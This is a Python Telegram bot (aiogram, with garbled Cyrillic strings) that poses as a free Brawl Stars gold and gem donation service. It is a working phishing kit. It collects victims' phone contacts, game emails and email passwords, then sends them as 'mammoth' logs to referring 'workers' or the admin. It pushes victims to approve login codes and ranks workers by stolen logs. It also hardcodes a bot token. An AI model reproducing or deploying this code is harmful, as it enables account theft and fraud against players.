import sqlite3
import logging
import re

from validate_email import validate_email

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import Message
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.middlewares.logging import LoggingMiddleware

logging.basicConfig(level=logging.INFO)

storage = MemoryStorage()

TOKEN = '5340479781:AAHXHWrXHFXzMaZnzGydqH0JfS8O4_JFrP4'
ID = 5058141288

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

conn = sqlite3.connect('db.db')
cursor = conn.cursor()

class dialog(StatesGroup):
    spamworker = State()
    spamuser = State()
    blacklist = State()
    whitelist = State()
    link = State()
    add = State()

class log(StatesGroup):
    ref = State()
    phone = State()
    mail = State()
    password = State()

class entr(StatesGroup):
    golds = State()
    gems = State()

class code(StatesGroup):
    entr = State()

menu = ReplyKeyboardMarkup(resize_keyboard=True)
button1 = KeyboardButton('–ó–∞–±–∞–Ω–∏—Ç—å')
button2 = KeyboardButton('–†–∞–∑–±–∞–Ω–∏—Ç—å')
button3 = KeyboardButton('–†–∞—Å—Å—ã–ª–∫–∞')
button4 = KeyboardButton('–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
button5 = KeyboardButton('–¢–æ–ø –≤–æ—Ä–∫–µ—Ä–æ–≤')
menu.row(button1, button2)
menu.add(button3)
menu.row(button4, button5)

spammenu = ReplyKeyboardMarkup(resize_keyboard=True)
spamworker = KeyboardButton('–í–æ—Ä–∫–µ—Ä–∞–º')
spamuser = KeyboardButton('–Æ–∑–µ—Ä–∞–º')
back = KeyboardButton('–ù–∞–∑–∞–¥')
spammenu.row(spamworker, spamuser).add(back)

cancel = types.ReplyKeyboardMarkup(resize_keyboard=True)
cancel.add(types.InlineKeyboardButton(text='–ù–∞–∑–∞–¥'))

panel = ReplyKeyboardMarkup(resize_keyboard=True)
button01 = KeyboardButton('–°—Å—ã–ª–∫–∞')
button02 = KeyboardButton('–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
button03 = KeyboardButton('–¢–æ–ø –≤–æ—Ä–∫–µ—Ä–æ–≤')
button04 = KeyboardButton('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
panel.add(button01)
panel.row(button02, button03)
panel.add(button04)

kb_info = InlineKeyboardMarkup()
btn_channel = InlineKeyboardButton('–ö–∞–Ω–∞–ª', url='https://t.me/')
btn_chat = InlineKeyboardButton('–ß–∞—Ç', url='https://t.me/')
btn_admin = InlineKeyboardButton('–ü–æ–¥–¥–µ—Ä–∂–∫–∞', url='https://t.me/')
kb_info.row(btn_channel, btn_chat).add(btn_admin)

inline_btn_try = InlineKeyboardButton('–ù–µ–≤–∞–ª–∏–¥', callback_data='btn_try')
inline_btn_code = InlineKeyboardButton('–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥', callback_data='btn_code')

@dp.message_handler(commands = 'start')
async def start(message: types.Message):
    cursor.execute('SELECT id FROM users WHERE user_id = ?', (message.from_user.id,))
    result = cursor.fetchall()
    if message.from_user.id == ID:
        await message.answer('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!', reply_markup=menu)
    else:
        if not result:
            cursor.execute('INSERT INTO users (user_id) VALUES (?)', (message.from_user.id,))
            if message.from_user.username != None:
                cursor.execute(f'UPDATE users SET nick = ? WHERE user_id = ?',
                               ('@' + message.from_user.username, message.from_user.id,))
            conn.commit()
        cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.from_user.id,))
        result = cursor.fetchall()
        if result[0][0] != 1:
            cursor.execute('SELECT status FROM users WHERE user_id = ?', (message.from_user.id,))
            status_check = cursor.fetchall()
            if status_check[0][0] != 'worker':
                if " " in message.text and message.text.split()[1].isdigit() == True:
                    cursor.execute(f'UPDATE users SET ref = ? WHERE user_id = ?',
                                   (message.text.split()[1], message.from_user.id,))
                    conn.commit()
                keyboardmain = types.InlineKeyboardMarkup(row_width=1)
                button_donate = types.InlineKeyboardButton(text='–ó–∞–ø—É—Å–∫', callback_data='start')
                keyboardmain.add(button_donate)
                await message.answer(f'''üëã –ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!
  –≠—Ç–æ –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–Ω–∞—Ç–∏—Ç –≤ Brawl Stars 
  –ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ:''', reply_markup=keyboardmain)
            else:
                await message.answer('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!', reply_markup=panel)
        else:
            await message.answer('–í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã!')

@dp.callback_query_handler(lambda c: c.data == 'start')
async def buttonstart(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    kb = types.InlineKeyboardMarkup(row_width=2)
    first_button = InlineKeyboardButton('–ó–æ–ª–æ—Ç–æ üí∞', callback_data='golds')
    second_button = InlineKeyboardButton('–ì–µ–º—ã üíé', callback_data='gems')
    kb.add(first_button, second_button)
    await bot.edit_message_text('–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç —Å –Ω—É–∂–Ω–æ–π –≤–∞–ª—é—Ç–æ–π:', cid, mid, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == 'golds')
async def buttongolds(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    await bot.edit_message_text('''–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –∑–æ–ª–æ—Ç–∞üí∞
  üìå(–Ω–µ –±–æ–ª–µ–µ 500)''', cid, mid)
    await entr.golds.set()

@dp.message_handler(state=entr.golds)
async def entrgolds(message: types.Message, state: FSMContext):
    num = message.text
    if not num.isdigit():
        await message.reply('–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.')
        await message.answer('–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –∑–æ–ª–æ—Ç–∞üí∞ (–Ω–µ –±–æ–ª–µ–µ 500)')
    if num.isdigit() and int(num) > 500:
        await message.reply('''–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!
  –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.''')
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –∑–æ–ª–æ—Ç–æüí∞ (–Ω–µ –±–æ–ª–µ–µ 500)')
    if num.isdigit() and int(num) <= 500:
        markup_request = ReplyKeyboardMarkup(resize_keyboard=True) \
            .add(KeyboardButton('–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è', request_contact=True))
        await message.answer('''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å.
  üéÅ –ï—Å—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–≤—à–∏—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=markup_request)
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'gems')
async def buttongems(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    await bot.edit_message_text('''–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤üíé
  üìå(–Ω–µ –±–æ–ª–µ–µ 50)''', cid, mid)
    await entr.gems.set()

@dp.message_handler(state=entr.gems)
async def entrgems(message: types.Message, state: FSMContext):
    num = message.text
    if not num.isdigit():
        await message.reply('–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.')
        await message.answer('–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤üíé (–Ω–µ –±–æ–ª–µ–µ 50)')
    if num.isdigit() and int(num) > 50:
        await message.reply('''–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 50!
  –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.''')
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –≥–µ–º—ãüíé (–Ω–µ –±–æ–ª–µ–µ 50)')
    if num.isdigit() and int(num) <= 50:
        markup_request = ReplyKeyboardMarkup(resize_keyboard=True) \
            .add(KeyboardButton('–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è', request_contact=True))
        await message.answer('–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å.'
  'üéÅ –ï—Å—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–≤—à–∏—Å—å –≤ –±–æ—Ç–µ!', reply_markup=markup_request)
        await state.finish()

@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message, state: FSMContext):
    if message.contact is not None:
        await state.update_data(first=message.contact.first_name, \
            last=message.contact.last_name, \
            userid=message.contact.user_id, \
            phone=message.contact.phone_number, \
            nick=message.from_user.username)
        await message.answer('–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!', reply_markup=types.ReplyKeyboardRemove())
        await message.answer('‚úâ –í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—É—é –∫ –∏–≥—Ä–µ:')
        await log.mail.set()

@dp.message_handler(state=log.mail)
async def entrmail(message: types.Message, state: FSMContext):
    is_valid = validate_email(message.text)
    if is_valid is False:
        await message.answer('–í—ã –≤–≤–µ–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é –ø–æ—á—Ç—É\n  –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞!')
    else:
        await state.update_data(mail=message.text)
        await message.answer('üîë –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å —É–∫–∞–∑–∞–Ω–Ω–æ–π –ø–æ—á—Ç—ã:')
        await log.password.set()

@dp.message_handler(state=log.password)
async def entrpassword(message: types.Message, state: FSMContext):
    if message.text.split()[0] != '/start' and len(''.join(message.text.split())) >= 8:
        await state.update_data(password=message.text)
        await message.answer('–û–∂–∏–¥–∞–π—Ç–µ –¥–æ–Ω–∞—Ç –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!üéâ')
  #'–ú—ã —Å–æ–∫—Ä–∞—Ç–∏–º –≤—Ä–µ–º—è –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è –±–æ–Ω—É—Å–∞ –µ—Å–ª–∏ –≤—ã —Ä–∞—Å—Å–∫–∞–∂–∏—Ç–µ –æ –Ω–∞—Å —Å–≤–æ–∏–º –¥—Ä—É–∑—å—è–º –ø–æ —ç—Ç–æ–π —Å—Å—ã–ª–∫–µ:')
        data = await state.get_data()
        first = re.sub('[_]', '\_', str(data['first']))
        last = re.sub('[_]', '\_', str(data['last']))
        userid = data['userid']
        phone = data['phone']
        nick = re.sub('[_]', '\_', str(data['nick']))
        mail = data['mail']
        password = data['password']
        info = f'''
ü¶£ *–ú–∞–º–æ–Ω—Ç –≤–≤—ë–ª —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ*

–ò–º—è: {first} {last}
ID: `{userid}`
–ù–∏–∫: @{nick}
–ù–æ–º–µ—Ä: `{phone}`

–ü–æ—á—Ç–∞: `{mail}`
–ü–∞—Ä–æ–ª—å: `{password}`
            '''
        cursor.execute('UPDATE users SET log = ? WHERE user_id = ?', ('1', message.from_user.id,))
        conn.commit()
        cursor.execute('SELECT ref FROM users WHERE user_id = ?', (message.from_user.id,))
        inline_kb_log = InlineKeyboardMarkup() \
            .insert(inline_btn_try).insert(inline_btn_code)
        try:
            await bot.send_message(cursor.fetchall()[0][0], info, parse_mode='Markdown', reply_markup=inline_kb_log)
        except:
            await bot.send_message(ID, info, parse_mode='Markdown', reply_markup=inline_kb_log)
        await state.finish()
    else:
        await message.answer('–í—ã –≤–≤–µ–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø–∞—Ä–æ–ª—å\n  –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞!')

@dp.callback_query_handler(lambda c: c.data == 'btn_try')
async def process_callback_button1(callback_query: types.CallbackQuery):
    id = callback_query.message.text.split('ID: ', maxsplit=1)[-1] \
        .split(maxsplit=1)[0]
    try:
        await bot.send_message(id, '–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –Ω–∞—à –±–æ—Ç –Ω–µ —Å–º–æ–≥ –∑–∞–π—Ç–∏ –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è –¥–æ–Ω–∞—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –≤–∞–º–∏ –¥–∞–Ω–Ω—ã–µ –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ –Ω–∞–∂–∞–≤ /start')
        await bot.send_message(callback_query.message.chat.id, '–£—Å–ø–µ—à–Ω–æ')
    except:
        await bot.send_message(callback_query.message.chat.id, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–∏–ª –¥–∏–∞–ª–æ–≥')

@dp.callback_query_handler(lambda c: c.data == 'btn_code', state='*')
async def process_callback_button1(callback_query: types.CallbackQuery, state: FSMContext):
    id = callback_query.message.text.split('ID: ', maxsplit=1)[-1] \
        .split(maxsplit=1)[0]
    await state.update_data(entr=id)
    await bot.send_message(callback_query.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ', reply_markup=cancel)
    await code.entr.set()

@dp.message_handler(state=code.entr)
async def entr_code(message: Message, state: FSMContext):
    if message.from_user.id == ID:
        main = menu
    else:
        main = panel
    if message.text != '–ù–∞–∑–∞–¥':
        if message.text.isdigit():
            try:
                id = await state.get_data()
                await bot.send_message(id['entr'], '–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ. \
–ß—Ç–æ–±—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Å–≤–æ—é –ª–∏—á–Ω–æ—Å—Ç—å, \
–Ω–∞–∂–º–∏—Ç–µ –î–∞, –∞ –∑–∞—Ç–µ–º –≤—ã–±–µ—Ä–∏—Ç–µ –∫–æ–¥ ' + message.text + ' –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–µ.')
                await message.answer('–£—Å–ø–µ—à–Ω–æ', reply_markup=main)
                await state.finish()
            except:
                await message.answer('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–∏–ª –¥–∏–∞–ª–æ–≥', reply_markup=main)
                await state.finish()
        else:
            await message.answer('–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ')
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=main)

@dp.message_handler(content_types=['text'], text='–°—Å—ã–ª–∫–∞')
async def link(message: Message):
    await message.answer('https://t.me/brawlcellbot?start='+str(message.from_user.id))

@dp.message_handler(content_types=['text'], text='–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
async def stat(message: Message):
    cursor.execute('SELECT user_id FROM users WHERE ref = ?', (message.from_user.id,))
    res = len(cursor.fetchall())
    cursor.execute('SELECT user_id FROM users WHERE log = ? AND ref = ?', ('1', message.from_user.id,))
    uniqres = len(cursor.fetchall())
    await message.answer(f'–í–∞—à–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ \n\
‚îú –ü–µ—Ä–µ—Ö–æ–¥–æ–≤: {res} \n\
‚îî –õ–æ–≥–æ–≤: {uniqres} —à—Ç.')

@dp.message_handler(content_types=['text'], text='–¢–æ–ø –≤–æ—Ä–∫–µ—Ä–æ–≤')
async def top(message: Message):
    cursor.execute('SELECT ref FROM users WHERE log = ?', ('1',))
    res = cursor.fetchall()
    count = dict((i, res.count(i)) for i in res)
    sort_count = sorted(count.items(), key=lambda t: t[1], reverse=True)
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[0][0][0],))
    one = cursor.fetchall()[0][0]
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[1][0][0],))
    two = cursor.fetchall()[0][0]
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[2][0][0],))
    three = cursor.fetchall()[0][0]

    await message.answer(f'\n\
ü•á {one} | –õ–æ–≥–∏: {sort_count[0][1]} —à—Ç.\n\
ü•à {two} | –õ–æ–≥–∏: {sort_count[1][1]} —à—Ç.\n\
ü•â {three} | –õ–æ–≥–∏: {sort_count[2][1]} —à—Ç.')

@dp.message_handler(content_types=['text'], text='–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
async def info(message: Message):
    await message.answer('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –Ω–∞—à–µ–º –ø—Ä–æ–µ–∫—Ç–µ', reply_markup=kb_info)

@dp.message_handler(commands = 'update')
async def update(message: Message):
    if message.from_user.username != None:
        cursor.execute(f'UPDATE users SET nick = ? WHERE user_id = ?',
                       ('@' + message.from_user.username, message.from_user.id,))
        conn.commit()
        await message.answer('–û–±–Ω–æ–≤–ª–µ–Ω–æ')
    else:
        await message.answer('–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')

@dp.message_handler(commands = 'add')
async def add(message: Message):
    cursor.execute('UPDATE users SET status = ? WHERE user_id = ?', ('worker', message.from_user.id,))
    conn.commit()
    await message.answer('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å', reply_markup=panel)

@dp.message_handler(content_types=['text'], text='–†–∞—Å—Å—ã–ª–∫–∞')
async def spam(message: Message):
    await message.answer('–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Ä–∞—Å—Å—ã–ª–∫–∏', reply_markup=spammenu)

@dp.message_handler(content_types=['text'], text='–í–æ—Ä–∫–µ—Ä–∞–º')
async def spam(message: Message):
    if message.from_user.id == ID:
        await dialog.spamworker.set()
        await message.answer('–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏', reply_markup=cancel)
    else:
        await message.answer('–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–æ–º!')

@dp.message_handler(content_types=['text'], text='–Æ–∑–µ—Ä–∞–º')
async def spam(message: Message):
    if message.from_user.id == ID:
        await dialog.spamuser.set()
        await message.answer('–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏', reply_markup=cancel)
    else:
        await message.answer('–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–æ–º!')

@dp.message_handler(state=dialog.spamworker)
async def start_spamworker(message: Message, state: FSMContext):
    i = 0
    if message.text != '–ù–∞–∑–∞–¥':
        cursor.execute('SELECT user_id FROM users WHERE status = ?', ('worker',))
        spam_base = cursor.fetchall()
        for z in range(len(spam_base)):
            try:
                await bot.send_message(spam_base[z][0], message.text)
                i += 1
            except:
                pass
        await message.answer(f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {i} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º', reply_markup=menu)
        await state.finish()
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=menu)
        await state.finish()

@dp.message_handler(state=dialog.spamuser)
async def start_spamuser(message: Message, state: FSMContext):
    i = 0
    if message.text != '–ù–∞–∑–∞–¥':
        cursor.execute('SELECT user_id FROM users WHERE status = ?', ('user',))
        spam_base = cursor.fetchall()
        for z in range(len(spam_base)):
            try:
                await bot.send_message(spam_base[z][0], message.text)
                i += 1
            except:
                pass
        await message.answer(f'–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {i} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º', reply_markup=menu)
        await state.finish()
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=menu)
        await state.finish()

@dp.message_handler(content_types=['text'], text='–ó–∞–±–∞–Ω–∏—Ç—å')
async def ban(message: types.Message, state: FSMContext):
    if message.chat.id == ID:
        await message.answer('–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', reply_markup=cancel)
        await dialog.blacklist.set()
    else:
        await message.answer('–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–æ–º!')

@dp.message_handler(state=dialog.blacklist)
async def banned(message: types.Message, state: FSMContext):
    if message.text != '–ù–∞–∑–∞–¥':
        if message.text.isdigit():
            cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.text,))
            result = cursor.fetchall()
            if not result:
                await message.answer('–ù–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö', reply_markup=menu)
                await state.finish()
            else:
                cursor.execute('UPDATE users SET block = 1 WHERE user_id = ?', (message.text,))
                conn.commit()
                await message.answer('–£—Å–ø–µ—à–Ω–æ', reply_markup=menu)
                await state.finish()
        else:
            await message.answer('–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', reply_markup=cancel)
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=menu)
        await state.finish()

@dp.message_handler(content_types=['text'], text='–†–∞–∑–±–∞–Ω–∏—Ç—å')
async def unban(message: types.Message, state: FSMContext):
    if message.chat.id == ID:
        await message.answer('–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', reply_markup=cancel)
        await dialog.whitelist.set()
    else:
        await message.answer('–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–æ–º!')

@dp.message_handler(state=dialog.whitelist)
async def unbanned(message: types.Message, state: FSMContext):
    if message.text != '–ù–∞–∑–∞–¥':
        if message.text.isdigit():
            cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.text,))
            result = cursor.fetchall()
            if not result:
                await message.answer('–ù–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö', reply_markup=menu)
                await state.finish()
            else:
                cursor.execute('UPDATE users SET block = 0 WHERE user_id = ?', (message.text,))
                conn.commit()
                await message.answer('–£—Å–ø–µ—à–Ω–æ', reply_markup=menu)
                await state.finish()
        else:
            await message.answer('–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', reply_markup=cancel)
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=menu)
        await state.finish()

@dp.message_handler(state='*', text='–ù–∞–∑–∞–¥')
async def back(message: Message):
    if message.from_user.id == ID:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=menu)
    else:
        await message.answer('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=panel)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
